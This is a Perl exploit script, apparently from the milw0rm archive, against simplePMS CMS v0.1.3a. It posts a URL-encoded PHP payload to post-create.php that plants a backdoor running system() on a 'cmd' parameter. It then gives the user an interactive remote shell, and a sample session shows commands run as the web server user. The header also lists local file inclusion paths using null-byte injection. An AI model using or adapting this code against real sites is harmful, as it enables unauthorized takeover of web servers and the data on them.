#!/usr/bin/perl

# Script  : simplePMS CMS v0.1.3a
# Download: http://garr.dl.sourceforge.net/sourceforge/simplepms/simplePMS-v0-1-3prealpha.tar.bz2
# Remote Command Execution Exploit
# Also affected to multiple LFI vulnerabilities <-- Needs Register Globals ON ($filename not declared)
#   /[path]/pages/template.php?filename=[lf]%00
#   /[path]/pages/comp-template.php?filename=[lf]%00
# by Osirys <osirys[at]autistici[dot]org>

# Let's go into the hacking ..

# osirys[~]>$ perl rcex.txt http://localhost/simplePMS-v0-1-3prealpha/
#
#   ---------------------------------------
#            SimplePMS CMS  v0.1.3a
#       Remote Command Execution Sploit
#                  by Osirys
#   ---------------------------------------
#
# [*] Adding evil post ..
# [*] Succesfully backdoored !
# [&] Hi my master, do your job now [!]
#
# shell[localhost]$> id
# uid=80(apache) gid=80(apache) groups=80(apache)
# shell[localhost]$> pwd
# /home/osirys/web/simplePMS-v0-1-3prealpha/posts
# shell[localhost]$> exit
# [-] Quitting ..
# osirys[~]>$

use LWP::UserAgent;
use IO::Socket;
use HTTP::Request::Common;

my $host =  $ARGV[0];
my $rand = int(rand 19) +1;
my $file = "h0x".$rand;

($host) || help("-1");
cheek($host) == 1 || help("-2");
&banner;

$datas = get_input($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);

my $url = $path."/post-create.php";

my $code = "insert=Before&filename=".$file."&topic=1337&story=owned%22%3Be".
           "cho+%22p0w%22%3Bif%28get_magic_quotes_gpc%28%29%29%7B+%24_GET%".
           "5Bcmd%5D%3Dstripslashes%28%24_GET%5Bcmd%5D%29%3B%7Dsystem%28%2".
           "4_GET%5Bcmd%5D%29%3Becho+%22p0w%22%3B%24a+%3D+%22o&poster=owner";

my $length = length($code);

my $data = "POST ".$url." HTTP/1.1\r\n".
           "Host: ".$h0st."\r\n".
           "Keep-Alive: 300\r\n".
           "Connection: keep-alive\r\n".
           "Content-Type: application/x-www-form-urlencoded\r\n".
           "Content-Length: ".$length."\r\n\r\n".
           $code."\r\n";

my $socket   =  new IO::Socket::INET(
                                         PeerAddr => $h0st,
                                         PeerPort => '80',
                                         Proto    => 'tcp',
                                    ) or die "[-] Can't connect to $h0st:80\n[?] $! \n\n";

print "[*] Adding evil post ..\n";
$socket->send($data);

while ((my $e = <$socket>)&&($own != 1)) {
    if ($e =~ /Sucessfully created post for/) {
        $own = 1;
        print "[*] Succesfully backdoored ! \n";
    }
}
$own == 1 || die "[-] Can't add posts !\n";

print "[&] Hi my master, do your job now [!]\n\n";
&exec_cmd;

sub exec_cmd {
    my(@outs,$out);
    $h0st !~ /www\./ || $h0st =~ s/www\.//;
    print "shell[$h0st]\$> ";
    $cmd = <STDIN>;
    $cmd !~ /exit/ || die "[-] Quitting ..\n";
    $exec_url = $host."/posts/".$file."-posts.php?cmd=".$cmd;
    $re = get_req($exec_url);
    $content = tag($re);
    if ($content =~ /p0w(.+)p0w/) {
        my $out = $1;
        $out =~ s/\$/ /g;
        $out =~ s/\*/\n/g;
        chomp($out);
        print "$out\n";
        &exec_cmd;
    }
    else {
        $c++;
        $cmd =~ s/\n//;
        print "bash: ".$cmd.": command not found\n";
        $c < 3 || die "[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n";
    }
}

sub get_req() {
    $link = $_[0];
    my $req = HTTP::Request->new(GET => $link);
    my $ua = LWP::UserAgent->new();
    $ua->timeout(4);
    my $response = $ua->request($req);
    return $response->content;
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.*)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub get_input() {
    my $host = $_[0];
    $host =~ /http:\/\/(.*)/;
    $s_host = $1;
    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st." ".$path;
    return $full_det;
}

sub tag() {
    my $string = $_[0];
    $string =~ s/\n/\*/g;
    return($string);
}

sub banner {
    print "\n".
          "  --------------------------------------- \n".
          "           SimplePMS CMS  v0.1.3a         \n".
          "      Remote Command Execution Sploit     \n".
          "                 by Osirys                \n".
          "  --------------------------------------- \n\n";
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &banner;
        print "\n[-] Bad hostname! \n";
    }
    elsif ($error == -2) {
        &banner;
        print "\n[-] Bad hostname address !\n";
    }
    print "[*] Usage : perl $0 http://hostname/cms_path\n\n";
    exit(0);
}

# milw0rm.com [2009-02-16]